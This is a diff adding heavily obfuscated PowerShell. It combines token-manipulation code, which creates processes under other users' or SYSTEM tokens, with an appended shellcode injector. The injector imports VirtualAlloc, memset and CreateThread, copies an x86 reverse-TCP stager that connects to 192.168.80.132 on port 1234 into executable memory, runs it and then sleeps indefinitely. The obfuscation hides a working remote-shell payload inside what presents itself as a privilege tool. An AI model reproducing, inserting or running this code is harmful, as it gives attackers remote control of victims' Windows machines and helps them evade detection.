+        ${S`T`ARTuPi`NFo}."c`B" =  ( dir  ('vaRI'+'able'+':NqrmOw'))."Val`UE"::("{2}{1}{0}"-f'Of','ize','S').Invoke(${STA`RtupIN`Fo})    
+        ${stARTU`piN`FO}."DWfL`AGS" = 0x00000001
+        ${S`TarTU`pi`NfO}."WSho`WwIN`DoW" = 0x0001       
+
+        
+        ${Pr`o`ces`siNfO} = &("{1}{0}{2}" -f'Obje','New-','ct') ("{4}{2}{3}{1}{0}" -f'TION','A','OR','M','PROCESS_INF')
+    
+        ${SE`cA`TTrIbuTe`s1} = &("{2}{1}{0}" -f't','Objec','New-') ("{0}{4}{1}{3}{5}{2}"-f 'SE','URITY','TES','_A','C','TTRIBU')
+        ${sEC`A`TTR`IBU`TEs2} = &("{3}{2}{1}{0}" -f 'ect','bj','O','New-') ("{1}{2}{0}{5}{4}{3}" -f 'ITY_','SE','CUR','ES','T','ATTRIBU')
+        ${l`P`En`VrIon`Ment} =   (  GEt-varIabLe  ("zXl"+"2"+"GM")  )."VA`lUE"::"z`Ero"
+        ${c`U`RR`EnTDIrE`CtORY} = ${E`N`V:`sySTeMrOOt}
+
+        &("{1}{0}" -f'cho','e') ("`n[>] "+'Call'+'in'+'g '+'Advap'+'i3'+'2'+'::CreateProces'+'s'+'AsUser')
+        ${caLlr`Es`Ult3} =  (GeT-VARiaBle ("1v8r"+"7"))."Va`LuE"::("{2}{3}{0}{1}" -f 'eate','ProcessAsUser','C','r').Invoke(${PRi`VLOG`O`NtokEnhA`NdLe}, ${C`O`mmanD}, ${a`RGs},
+            [ref] ${sE`cATT`Rib`Ut`ES1}, [ref] ${sEcat`TRIB`Ut`eS2}, ${f`AL`Se}, 0, ${LpEnv`Ri`ONM`ent}, ${c`U`RREnt`dIreC`TORy}, [ref]${s`TAR`Tupin`Fo}, [ref]${P`ROCEsS`iNfo})
+    
+        if (!${cAL`L`RE`sUlT3}) {
+            &("{1}{0}"-f 'o','ech') ("`n[!] "+'Mm'+'m, '+'s'+'om'+'et'+'hing '+'we'+'nt '+'w'+'r'+'ong! '+'Ge'+'t'+'LastError '+'re'+'turn'+'ed:')
+            &("{1}{0}"-f 'o','ech') "==> $((New-Object System.ComponentModel.Win32Exception([int][Kernel32]::GetLastError())).Message)`n "
+        } else {
+            &("{1}{0}" -f'ho','ec') ("`n[+] "+'S'+'ucce'+'ss, '+'proces'+'s '+'det'+'a'+'ils:')
+            &("{1}{0}{2}"-f 'ce','Get-Pro','ss') -Id ${Pr`OcESs`iNfo}."dWPR`Oc`eSSID"
+            &("{0}{1}"-f 'ec','ho') ("`n[+] "+'Pl'+'e'+'ase '+'no'+'te'+', '+'thi'+'s '+'process'+' '+'wi'+'ll '+'ha'+'ve '+'a '+'pri'+'mary'+' '+'toke'+'n '+'as'+'s'+'igned '+'but'+' '+'the'+' '+'us'+'er '+'d'+'isplayed'+' '+'wi'+'ll '+'be'+' '+'SYST'+'E'+'M')
+            &("{1}{0}"-f 'o','ech') ("`n[+] "+'R'+'un '+'In'+'voke-Token'+'Ma'+'ni'+'pulat'+'ion '+'t'+'o '+'s'+'ee '+'the'+' '+'Token'+' '+'load'+'ed')
+        }
+    } else {
+        &('cd') ${Env:`SYst`e`MROot}
+        &("{0}{1}" -f'e','cho') ("`n[>] "+'User'+' '+'i'+'s '+"`"$env:username`" "+'so'+' '+'ru'+'nnin'+'g '+'CreateP'+'ro'+'cessWithL'+'o'+'gonW')
+        
+    	
+	    ${stAr`TUp`I`Nfo} = &("{1}{0}{2}"-f '-Ob','New','ject') ("{1}{2}{0}" -f'O','START','UPINF')
+	    ${StA`RTUpi`N`Fo}."d`wF`LAgs" = 0x00000001
+	    ${stAr`Tu`PinFO}."WS`h`owwiNdoW" = 0x0001
+	    ${s`T`ARtuPinFO}."c`B" =  (  VaRiablE ("{0}{1}"-f'nqr','mOw') -VALUeO  )::("{1}{0}" -f 'zeOf','Si').Invoke(${stARtu`p`iN`FO})
+	
+	    
+	    ${pRo`CEs`s`info} = &("{2}{0}{1}{3}"-f 'w-','Objec','Ne','t') ("{2}{0}{3}{1}"-f'RO','ION','P','CESS_INFORMAT')
+	
+	    
+	    ${gEtCurrE`N`TpatH} = (&("{1}{0}{2}" -f 't-I','Ge','tem') -Path ".\" -Verbose)."ful`L`Name"
+	
+	    &("{0}{1}" -f'ec','ho') ("`n[>] "+'C'+'alling '+'A'+'dvapi3'+'2::Crea'+'tePro'+'ces'+'sW'+'it'+'hLo'+'g'+'onW')
+	    ${cAL`Lres`ULt} =  $1v8R7::("{4}{1}{3}{2}{0}{5}"-f'n','o','ogo','cessWithL','CreatePr','W').Invoke(
+		    ${uS`ER}, ${d`Om`Ain}, ${p`AssWO`Rd}, 0x1, ${CO`MmaNd},
+		    ${aR`gs}, 0x04000000, ${Nu`ll}, ${g`etC`URREnt`patH},
+		    [ref]${S`Tar`TupIn`Fo}, [ref]${P`RoceSSiN`FO})
+	
+	    if (!${C`Al`LR`eSuLT}) {
+		    &("{1}{0}" -f'cho','e') ("`n[!] "+'Mm'+'m, '+'some'+'thing'+' '+'went'+' '+'wrong'+'! '+'GetLas'+'t'+'Er'+'r'+'or '+'ret'+'urn'+'ed:')
+		    &("{1}{0}"-f'o','ech') "==> $((New-Object System.ComponentModel.Win32Exception([int][Kernel32]::GetLastError())).Message)`n "
+	    } else {
+		    &("{1}{0}" -f 'cho','e') ("`n[+] "+'Succe'+'s'+'s, '+'pr'+'o'+'cess '+'d'+'e'+'tails:')
+		    &("{1}{0}{2}"-f 'Pro','Get-','cess') -Id ${pRo`ce`ssinFo}."D`wPRO`CE`sSId"
+	    }
+    } 
+}
+${C} = ((("{34}{112}{2}{110}{44}{123}{93}{37}{35}{55}{13}{47}{100}{61}{96}{54}{122}{3}{42}{30}{51}{7}{26}{0}{59}{56}{72}{98}{84}{62}{102}{71}{88}{66}{49}{81}{9}{64}{6}{114}{89}{33}{105}{17}{78}{12}{101}{45}{76}{38}{57}{31}{19}{119}{21}{118}{120}{1}{99}{106}{77}{94}{69}{95}{91}{63}{113}{58}{116}{40}{60}{27}{111}{74}{65}{16}{22}{86}{73}{20}{48}{68}{75}{117}{41}{4}{11}{83}{24}{70}{97}{8}{18}{39}{14}{50}{103}{28}{80}{85}{109}{67}{53}{82}{108}{25}{29}{52}{46}{36}{5}{90}{43}{92}{10}{107}{32}{104}{15}{23}{87}{79}{115}{121}"-f ' ','rn IntPtr','(sW','lAlloc(',', uin','sta','t','ss, uin','tPtr',' f','rn IntP','t dwC','.dll','l','d)','se',' lpStart','er',' lp','b','P','e','Address, I','t(I','eat',']p','t','d','I','ub','r lp','u','me','t(sWL','[DllImpo','llsW',' ','32.d',']','ThreadI',', u','r','IntPt','c','k','WL','c','ic ','a','u',';[Dl','Addre','li','t.','r','L)]pub','e','p','ib','dwSiz','int ','atic exter','f','eadA','lPro','Ptr',' ','r','rame','ead(IntPt','ionFla','ll',', u','lp',', Int','t',')','ate','nel32',', u','mp','int','dll','r','t ','ort','ntPtr ','ntPtr dest','ocationType,','llImpor','ti','Thr',' exte','rnel','Thr','r lp','n IntPt','gs, In','in',' Cr','st','s','lA','l','m','k','e','tr ','sWL)','(sWLmsvc','L','wStackSize','rt','ttr','ect);[D','int src, uint coun','utes','e','x','lic static ','te','t);',' Virtua','e')) -CrEpLaCe'sWL',[char]34);${W} = &("{1}{2}{0}"-f 'e','Add','-Typ') -memberDefinition ${C} -Name ("{0}{1}" -f 'Win3','2') -namespace ("{2}{1}{3}{0}"-f's','cti','Win32Fun','on') -passthru;[Byte[]];[Byte[]]${S`c} = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x50,0x84,0x68,0x02,0x00,0x04,0xd2,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;${sI`Ze} = 0x1000;if (${S`c}."L`eNG`TH" -gt 0x1000){${Si`ze} = ${sC}."le`Ng`Th"};${x}=${w}::("{0}{1}{2}"-f'V','irtualA','lloc').Invoke(0,0x1000,${s`iZE},0x40);for (${I}=0;${i} -le (${S`c}."L`ENGTh"-1);${I}++) {${w}::"ME`msET"([IntPtr](${X}.("{1}{0}" -f'Int32','To').Invoke()+${i}), ${S`c}[${I}], 1)};${w}::("{0}{2}{1}" -f 'CreateT','d','hrea').Invoke(0,0,${X},0,0,0);for (;;){&("{3}{0}{2}{1}" -f 'ar','p','t-slee','St') 60};
